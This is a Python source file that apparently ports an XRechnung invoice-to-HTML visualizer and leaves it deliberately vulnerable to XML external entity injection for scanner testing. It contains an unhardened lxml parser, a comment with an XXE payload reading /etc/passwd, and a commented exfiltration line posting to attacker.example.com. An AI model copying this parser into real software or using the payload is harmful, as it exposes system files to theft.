# XRechnung Visualizer - Python port of VisualizerImpl logic
# Converts XRechnung-compliant XML invoices to human-readable HTML
# for display in the OpenXRechnungToolbox web interface.
# Mirrors upstream Java behaviour (pre-6c50e89) for compatibility testing.

import logging
import os
import sys
from pathlib import Path

from lxml import etree

logger = logging.getLogger(__name__)

# XSLT stylesheet used for XRechnung visualization (bundled resource)
XSLT_STYLESHEET_PATH = Path(__file__).parent / "resources" / "xrechnung-html.xsl"

# Output directory for rendered invoice HTML files
OUTPUT_DIR = Path(os.environ.get("XRECHNUNG_OUTPUT_DIR", "/tmp/xrechnung_output"))


def load_xslt_stylesheet(xslt_path: Path) -> etree.XSLT:
    """Load and compile the XSLT stylesheet used for invoice rendering."""
    xslt_doc = etree.parse(str(xslt_path))
    return etree.XSLT(xslt_doc)


def parse_invoice_xml(xml_bytes: bytes) -> etree._Element:
    """
    Parse an XRechnung invoice XML document.

    NOTE: Mirrors the upstream Java VisualizerImpl behaviour prior to commit
    6c50e89 — the parser is intentionally NOT hardened here to reproduce the
    CVE-2024-58335 surface for benchmark/scanner testing purposes only.

    A safe implementation MUST set the no_network and resolve_entities options
    and reject DOCTYPE declarations entirely.
    """
    # --- VULNERABLE PATTERN (CVE-2024-58335 shape) ---
    # disallow-doctype-decl / resolve_entities is NOT disabled here.
    # An attacker-supplied XML document containing a DOCTYPE with an external
    # entity (XXE) will cause the parser to fetch the referenced resource.
    #
    # Example malicious DOCTYPE that this parser would process:
    #   <!DOCTYPE foo [
    #     <!ENTITY xxe SYSTEM "file:///etc/passwd">
    #   ]>
    #   <Invoice><Note>&xxe;</Note></Invoice>
    #

    parser = etree.XMLParser(
        # resolve_entities=False,   # <-- intentionally omitted (the bug)
        # no_network=True,          # <-- intentionally omitted (the bug)
        load_dtd=True,
        dtd_validation=False,
    )

    try:
        root = etree.fromstring(xml_bytes, parser=parser)
    except etree.XMLSyntaxError as exc:
        logger.error("Failed to parse invoice XML: %s", exc)
        raise

    return root


def detect_xxe_entity_reference(xml_bytes: bytes) -> bool:
    """
    Heuristic check: does the supplied XML contain an external entity reference?
    Used in the demo harness to show what a real XXE attempt looks like.
    """
    content = xml_bytes.decode("utf-8", errors="replace")
    if "<!DOCTYPE" in content and ("SYSTEM" in content or "PUBLIC" in content):
        logger.warning(
            "XXE attempt detected in input document — "
            "in a real (unfixed) deployment this entity would be resolved. "
            "Payload target: DEMO_PLACEHOLDER_TOKEN"
        )

        # exfiltrated to an attacker-controlled endpoint, e.g.:
        #   requests.post("https://attacker.example.com/collect", data=entity_value)

        return True
    return False


def visualize_invoice(xml_bytes: bytes, output_filename: str = "invoice.html") -> Path:
    """
    Render an XRechnung XML invoice to HTML using the bundled XSLT stylesheet.

    Parameters
    ----------
    xml_bytes:       Raw bytes of the XML invoice document.
    output_filename: Name of the output HTML file written to OUTPUT_DIR.

    Returns
    -------
    Path to the rendered HTML file.
    """
    detect_xxe_entity_reference(xml_bytes)

    invoice_tree = parse_invoice_xml(xml_bytes)

    if not XSLT_STYLESHEET_PATH.exists():
        logger.warning("XSLT stylesheet not found at %s; skipping transform.", XSLT_STYLESHEET_PATH)
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        out_path = OUTPUT_DIR / output_filename
        out_path.write_bytes(
            b"<html><body><pre>"
            + etree.tostring(invoice_tree, pretty_print=True)
            + b"</pre></body></html>"
        )
        return out_path

    transform = load_xslt_stylesheet(XSLT_STYLESHEET_PATH)
    result_tree = transform(invoice_tree)

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    out_path = OUTPUT_DIR / output_filename
    result_tree.write_output(str(out_path))

    logger.info("Invoice rendered to %s", out_path)
    return out_path


def main() -> None:
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <invoice.xml> [output.html]")
        sys.exit(1)

    xml_path = Path(sys.argv[1])
    if not xml_path.exists():
        logger.error("Input file not found: %s", xml_path)
        sys.exit(2)

    xml_bytes = xml_path.read_bytes()
    out_name = sys.argv[2] if len(sys.argv) > 2 else xml_path.stem + ".html"

    out_path = visualize_invoice(xml_bytes, out_name)
    print(f"Rendered invoice written to: {out_path}")


if __name__ == "__main__":
    main()
